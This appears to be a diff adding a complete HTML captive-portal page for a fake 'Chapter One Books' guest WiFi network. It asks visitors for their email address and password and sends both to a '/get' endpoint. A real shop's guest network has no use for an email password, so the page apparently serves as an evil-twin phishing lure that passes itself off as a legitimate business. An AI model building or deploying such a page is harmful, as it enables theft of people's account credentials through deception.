@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Chapter One Books — WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Georgia,"Times New Roman",serif;background:#faf6ef;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:390px;background:#fffdf8;border-radius:4px;overflow:hidden;box-shadow:0 4px 30px rgba(0,0,0,0.08);border:1px solid #e8dcc8}
+.spine{height:6px;background:repeating-linear-gradient(90deg,#2d5a27 0,#2d5a27 18px,#8B4513 18px,#8B4513 36px,#003DA5 36px,#003DA5 54px,#CC0000 54px,#CC0000 72px,#FFB700 72px,#FFB700 90px)}
+.top{padding:28px 28px 22px;text-align:center;border-bottom:1px solid #e8dcc8}
+.store-name{font-size:20px;font-weight:700;color:#2a1a0a;letter-spacing:0.5px}
+.store-sub{font-size:9.5px;color:#9a8060;letter-spacing:2px;text-transform:uppercase;margin-top:5px;font-family:-apple-system,sans-serif}
+.ssid-row{display:inline-flex;align-items:center;gap:7px;background:#f5f0e8;border-radius:3px;padding:5px 12px;margin-top:14px;border:1px solid #e8dcc8}
+.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
+.ssid-row span{font-size:11px;color:#9a8060;font-family:-apple-system,sans-serif}
+.ssid-row strong{color:#6a5040;font-weight:600}
+.body{padding:24px 28px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+h2{font-size:16px;font-weight:700;color:#2a1a0a;margin-bottom:3px}
+.sub{font-size:12.5px;color:#9a8060;margin-bottom:18px}
+.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#9a8060;margin-bottom:7px;margin-top:18px}
+input{width:100%;padding:11px 13px;border:1.5px solid #e0d8c8;border-radius:4px;font-size:14px;background:#fdf8f0;color:#2a1a0a}
+input:focus{outline:none;border-color:#8B4513;box-shadow:0 0 0 3px rgba(139,69,19,0.07)}
+input::placeholder{color:#c8b8a0}
+.btn{width:100%;padding:12px;margin-top:20px;border:none;border-radius:4px;background:#2a1a0a;color:#f5e8d0;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:0.3px}
+.terms{font-size:11px;color:#b0a090;text-align:center;margin-top:13px;line-height:1.6}
+.terms a{color:#8B4513}
+.foot{background:#f5f0e8;border-top:1px solid #e8dcc8;padding:11px 28px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:10px;color:#b0a090;font-family:-apple-system,sans-serif;text-decoration:none}
+.foot a{color:#8B4513}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="spine"></div>
+  <div class="top">
+    <div class="store-name">Chapter One Books</div>
+    <div class="store-sub">Independent Bookseller &bull; Est. 1987</div>
+    <div class="ssid-row"><div class="dot"></div><span>Network: <strong>ChapterOne-WiFi</strong></span></div>
+  </div>
+  <div class="body">
+    <h2>Reader WiFi Access</h2>
+    <p class="sub">Sign in and settle in — stay as long as you like.</p>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit" class="btn">Connect to WiFi</button>
+      <p class="terms">By connecting you agree to our <a href="#">guest internet policy</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; Chapter One Books</span><a href="#">Help</a></div>
+</div>
+</body>
+</html>
